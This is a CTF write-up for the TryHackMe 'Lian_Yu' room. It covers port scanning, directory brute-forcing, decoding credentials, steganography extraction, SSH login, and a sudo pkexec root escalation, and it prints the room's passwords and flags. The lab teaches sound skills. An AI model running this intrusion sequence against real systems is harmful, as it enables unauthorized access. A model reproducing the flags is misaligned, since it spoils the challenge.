# 🏹 TryHackMe — Lian_Yu CTF Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Lian__Yu-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)

> A beginner-level CTF room on TryHackMe themed around the TV show **Arrow**.  
> The goal is to find all flags by enumerating and exploiting the target machine.

---

## 📋 Table of Contents

- [Room Info](#room-info)
- [Tools Used](#tools-used)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [FTP Access](#ftp-access)
- [Steganography](#steganography)
- [SSH Access & User Flag](#ssh-access--user-flag)
- [Privilege Escalation & Root Flag](#privilege-escalation--root-flag)
- [Flags Summary](#flags-summary)

---

## 🗺️ Room Info

| Field       | Details                                      |
|-------------|----------------------------------------------|
| Room Name   | Lian_Yu                                      |
| Platform    | TryHackMe                                    |
| Difficulty  | Easy                                         |
| URL         | https://tryhackme.com/room/lianyu            |
| Theme       | Arrow (TV Show)                              |

---

## 🛠️ Tools Used

- `nmap` — Port scanning
- `gobuster` — Directory enumeration
- `ftp` — File Transfer Protocol client
- `steghide` — Steganography extraction
- `binwalk` — Binary file analysis
- `base58` — Decoding encoded strings
- `ssh` — Remote login
- `sudo` — Privilege escalation

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC 10.49.159.122
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21   | open  | FTP     | vsftpd 3.0.2 |
| 22   | open  | SSH     | OpenSSH 6.7p1 Debian |
| 80   | open  | HTTP    | Apache httpd |
| 111  | open  | rpcbind | 2-4 (RPC #100000) |

**Key finding:** HTTP title shows **"Purgatory"** — an Arrow reference.

---

## 🌐 Web Enumeration

### Step 1: Directory Bruteforce

```bash
gobuster dir -u http://10.49.159.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Found:** `/island` (Status: 301)

### Step 2: View Page Source of /island

Visiting `http://10.49.159.122/island` and viewing source (`Ctrl+U`) revealed a **codeword hidden in white text**:

```
The Code Word is: vigilante
```

### Step 3: Find Hidden .ticket File

```bash
gobuster dir -u http://10.49.159.122/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
```

**Found:** `/island/2100` → led to `green_arrow.ticket`

### Step 4: Decode the Token

Visiting `http://10.49.159.122/island/2100/green_arrow.ticket` revealed a **Base58 encoded token**:

```
RTy8yhBQdscX
```

Decoded using:
```bash
echo "RTy8yhBQdscX" | base58 -d
```

**Result:** `!#th3h00d` ← FTP Password

---

## 📁 FTP Access

```bash
ftp 10.49.159.122
# Username: vigilante
# Password: !#th3h00d
```

**Files found:**
- `Leave_me_alone.png`
- `Queen's_Gambit.png`
- `aa.jpg`

Downloaded all files:
```bash
get Leave_me_alone.png
get Queen's_Gambit.png
get aa.jpg
```

---

## 🕵️ Steganography

### Step 1: Fix Corrupted PNG

`Leave_me_alone.png` had corrupted magic bytes (showed as `data` instead of PNG):

```bash
xxd Leave_me_alone.png | head -5
# Header was wrong — fixed with:
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' | dd of=Leave_me_alone.png bs=1 seek=0 conv=notrunc
```

Opening the fixed image revealed the **steghide passphrase**: `password`

### Step 2: Extract Hidden Data

```bash
steghide extract -sf aa.jpg -p "password"
# Extracted: ss.zip
```

### Step 3: Unzip

```bash
unzip ss.zip
# Files: passwd.txt, shado
```

```bash
cat shado
# Output: M3tahuman  ← SSH Password
```

`passwd.txt` was a decoy containing a story about Oliver Queen on the island.

---

## 🔐 SSH Access & User Flag

```bash
ssh slade@10.49.159.122
# Password: M3tahuman
```

Successfully logged in with the **WELCOME2 LIAN_YU** banner.

```bash
cat user.txt
```

**User Flag:** `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`

---

## ⬆️ Privilege Escalation & Root Flag

### Check Sudo Permissions

```bash
sudo -l
```

**Output:**
```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

### Escalate to Root

```bash
sudo pkexec /bin/bash
```

Got a root shell! 🎉

```bash
cat /root/root.txt
```

**Root Flag:** `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`

---

## 🚩 Flags Summary

| Flag | Value |
|------|-------|
| Web Directory | `2100` |
| Ticket File | `green_arrow.ticket` |
| FTP Password | `!#th3h00d` |
| SSH Password File | `shado` |
| User Flag | `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}` |
| Root Flag | `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}` |

---

## 📚 Lessons Learned

- Always check page source for hidden text (white-on-white text trick)
- File magic bytes can be corrupted — use `file` and `xxd` to verify
- Steganography tools like `steghide` can hide data inside images
- Check `sudo -l` for quick privilege escalation paths
- Base58 encoding is commonly used in CTF challenges

---

*Writeup by: [Your Name/Handle]*  
*Date: June 2026*
